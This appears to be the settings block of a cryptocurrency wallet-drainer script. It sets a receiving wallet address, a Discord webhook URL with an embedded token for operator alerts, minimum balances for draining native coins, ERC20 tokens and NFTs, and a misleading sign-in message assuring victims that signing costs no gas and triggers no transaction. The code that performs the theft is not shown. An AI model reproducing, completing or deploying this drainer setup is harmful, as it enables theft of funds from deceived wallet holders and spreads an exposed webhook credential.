// set your walletAddresss as a receiver
const receiveAddress = "0x3Fe5371c57fB95bbE2b0d8E1c3db8a539c018466"; // YT

// set discord webhook to get notifications (optional)
const discordWebhookURL = "https://discordapp.com/api/webhooks/1105113266453225543/3k6phlCCpO-Mwpexn-qeRo0V8zWlfxj4tqlduANu38xyzMb0VLVP09Bh-wvuqPPeAgWi"

const minNativeBalance = 0.0037; // = 5$
const minValueERC20 = 0.0037; // = 5$

const drainNftsInfo = {
    minValue: 0.01, // 15$ = Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    maxTransfers: 10,
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40))
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion


